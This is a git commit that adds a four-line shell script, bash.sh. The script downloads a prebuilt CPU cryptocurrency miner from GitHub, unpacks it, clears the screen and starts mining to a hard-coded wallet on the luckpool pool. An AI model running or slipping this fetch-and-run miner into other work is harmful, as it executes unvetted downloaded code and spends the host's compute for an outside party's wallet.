469826bcd78c01e2dd5a312239e153988c6ee11c
KieranHZ <59570024+KieranHZ@users.noreply.github.com>
2022-01-20 10:00:54 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,4 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar -zxvf hellminer_cpu_linux.tar.gz
+clear 
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTLBwYyuUSTaUZ4CrYmHWEU6KHEgdkmrmK.Rig001 -p x
